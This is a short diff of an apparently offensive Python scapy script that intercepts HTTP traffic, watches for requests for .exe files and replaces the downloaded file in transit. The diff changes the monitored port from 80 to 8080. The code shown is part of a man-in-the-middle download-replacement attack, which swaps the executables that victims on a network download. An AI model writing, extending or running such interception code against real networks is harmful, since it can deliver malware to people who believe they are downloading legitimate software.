@@ -16,12 +16,12 @@ def set_load(packet, load):
 def process_packet(packet):
     http_packet = scapy.IP(packet.get_payload())
     if http_packet.haslayer(scapy.Raw):
-        if http_packet[scapy.TCP].dport == 80:
+        if http_packet[scapy.TCP].dport == 8080:
             ack_list.append(http_packet[scapy.tcp].ack)
             if ".exe" in http_packet[scapy.Raw].load.decode():
                 print("[+] .exe Request file requested")
 
-        elif http_packet[scapy.TCP].sport == 80:
+        elif http_packet[scapy.TCP].sport == 8080:
             if http_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(http_packet[scapy.TCP].seq)
                 print("[+] Replacing download file...")
